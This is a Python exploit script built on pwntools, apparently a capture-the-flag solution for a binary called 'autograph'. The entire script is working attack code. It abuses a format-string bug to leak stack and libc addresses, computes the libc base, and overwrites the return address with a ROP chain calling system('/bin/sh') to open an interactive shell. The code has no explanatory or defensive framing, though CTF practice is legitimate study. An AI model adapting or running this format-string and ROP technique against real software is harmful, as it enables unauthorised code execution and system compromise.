from pwnlib.fmtstr import FmtStr, fmtstr_split, fmtstr_payload
from pwn import *

context.arch = 'amd64'

elf = ELF('/mnt/c/Users/zahar/Downloads/autograph')

# remote libc = ?
libc = ELF('/lib64/libc.so.6')

# local libc
# libc = ELF('/lib64/libc.so.6')

# context.terminal = ["tmux", "splitw"]
# p = gdb.debug('/mnt/c/Users/zahar/Downloads/autograph')
# p = remote('cybergon2023.webhop.me', 5001)
p = process('/mnt/c/Users/zahar/Downloads/autograph')

def send_payload(payload):
    p.recvuntil(b'Enter choice: ')
    p.sendline(b'9')
    p.recvuntil(b'Enter your notes: ')
    p.sendline(payload)
    p.recvuntil(b'You Notes:\n')
    return p.recvline().strip()

format_string = FmtStr(execute_fmt=send_payload)

main_addr_offset = 0x2b
libc_start_main_138_addr_offset = 0x3d
rbp_offset = 0x20

main_addr = int(send_payload('%' + str(format_string.offset + main_addr_offset) + '$p'), base=16)
debug_notes_addr = main_addr - elf.symbols['main'] + elf.symbols['debug_notes']

rbp_addr = int(send_payload('%' + str(format_string.offset + rbp_offset) + '$p'), base=16) - 0x20
rsp_addr = rbp_addr - 0x100
ret_addr = rbp_addr + 0x8

libc_start_main_addr = int(send_payload('%' + str(format_string.offset + libc_start_main_138_addr_offset) + '$p'), base=16) - 138
libc_base = libc_start_main_addr - libc.symbols['__libc_start_main']

ROP_LOADED = ROP(libc)
POP_RDI = libc_base + ROP_LOADED.find_gadget(['pop rdi', 'ret'])[0]
BIN_SH = libc_base + next(libc.search(b'/bin/sh'))
SYSTEM = libc_base + libc.symbols['system']

send_payload(fmtstr_payload(writes={ ret_addr: debug_notes_addr, ret_addr + 16: BIN_SH }, offset=format_string.offset))

get_shell = fmtstr_payload(writes={ ret_addr + 24: SYSTEM, ret_addr + 8: POP_RDI }, offset=format_string.offset)
p.sendline(get_shell)

p.interactive()
